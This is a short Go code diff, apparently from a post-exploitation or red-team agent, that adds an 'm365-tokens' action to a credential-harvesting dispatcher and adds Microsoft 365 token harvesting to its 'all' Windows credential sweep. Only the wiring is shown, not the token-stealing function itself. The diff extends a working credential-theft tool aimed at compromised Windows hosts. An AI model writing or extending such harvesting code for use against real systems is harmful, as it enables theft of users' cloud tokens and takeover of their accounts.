@@ -19,10 +19,12 @@ func credHarvestDispatch(args credHarvestArgs) structs.CommandResult {
 		return credConfigs(args)
 	case "windows":
 		return credWindows(args)
+	case "m365-tokens":
+		return credM365Tokens(args)
 	case "all":
 		return credAllWindows(args)
 	default:
-		return errorf("Unknown action: %s\nAvailable: cloud, configs, windows, all", args.Action)
+		return errorf("Unknown action: %s\nAvailable: cloud, configs, windows, m365-tokens, all", args.Action)
 	}
 }
 
@@ -199,8 +201,15 @@ func credAllWindows(args credHarvestArgs) structs.CommandResult {
 
 	configs := credConfigs(args)
 	sb.WriteString(configs.Output)
+	sb.WriteString("\n")
 	if configs.Credentials != nil {
 		allCreds = append(allCreds, *configs.Credentials...)
+	}
+
+	m365 := credM365Tokens(args)
+	sb.WriteString(m365.Output)
+	if m365.Credentials != nil {
+		allCreds = append(allCreds, *m365.Credentials...)
 	}
 
 	result := structs.CommandResult{
